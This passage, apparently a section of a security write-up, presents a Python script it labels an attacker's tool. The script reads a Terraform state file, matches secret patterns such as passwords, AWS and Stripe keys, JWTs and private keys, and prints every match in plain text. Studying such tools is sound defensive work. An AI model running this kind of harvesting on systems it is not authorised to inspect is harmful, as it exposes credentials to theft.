### 3. **Python Script for State File Extraction** (attacker's tool)

```python
#!/usr/bin/env python3
# extract_secrets_from_state.py

import json
import re
import sys
from pathlib import Path

def extract_secrets_from_state(state_file_path):
    """Extract secrets from Terraform state file"""

    with open(state_file_path, 'r') as f:
        state_data = json.load(f)

    secrets_found = {}

    # Pattern to identify potentially sensitive data
    sensitive_patterns = [
        r'pass(word|wd|phrase)?',
        r'secret',
        r'key',
        r'token',
        r'auth',
        r'credential',
        r'private',
        r'certificate',
        r'pem',
        r'jwt',
        r'api[_-]?key',
        r'bearer',
        r'access[_-]?token'
    ]

    def is_sensitive_key(key):
        """Check if a key name suggests sensitive data"""
        key_lower = key.lower()
        return any(re.search(pattern, key_lower) for pattern in sensitive_patterns)

    # Search through resources
    for resource in state_data.get('resources', []):
        resource_type = resource.get('type', '')
        resource_name = resource.get('name', '')

        for instance in resource.get('instances', []):
            attributes = instance.get('attributes', {})

            for key, value in attributes.items():
                if is_sensitive_key(key) and value:
                    full_key = f"{resource_type}.{resource_name}.{key}"
                    secrets_found[full_key] = value

    # Search through outputs
    for output_name, output_data in state_data.get('outputs', {}).items():
        if 'value' in output_data:
            value = output_data['value']
            # Check if output contains common secret patterns
            if isinstance(value, str):
                # Look for common secret patterns in values
                secret_patterns = [
                    r'sk_live_[a-zA-Z0-9]{24}',
                    r'AKIA[0-9A-Z]{16}',
                    r'eyJhbGciOiJ[^\s]{100,}',  # JWT pattern
                    r'-----BEGIN PRIVATE KEY-----',
                    r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'  # UUID
                ]

                for pattern in secret_patterns:
                    if re.search(pattern, value):
                        secrets_found[f"output.{output_name}"] = value
                        break

    return secrets_found

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <path_to_state_file>")
        sys.exit(1)

    state_file = sys.argv[1]

    if not Path(state_file).exists():
        print(f"Error: State file {state_file} not found")
        sys.exit(1)

    secrets = extract_secrets_from_state(state_file)

    if secrets:
        print("🔐 SECRETS FOUND IN TERRAFORM STATE:")
        print("=" * 50)
        for key, value in secrets.items():
            print(f"\n{key}:")
            print(f"  {value}")
        print(f"\nTotal secrets found: {len(secrets)}")
    else:
        print("No secrets found in state file")

if __name__ == "__main__":
    main()
```

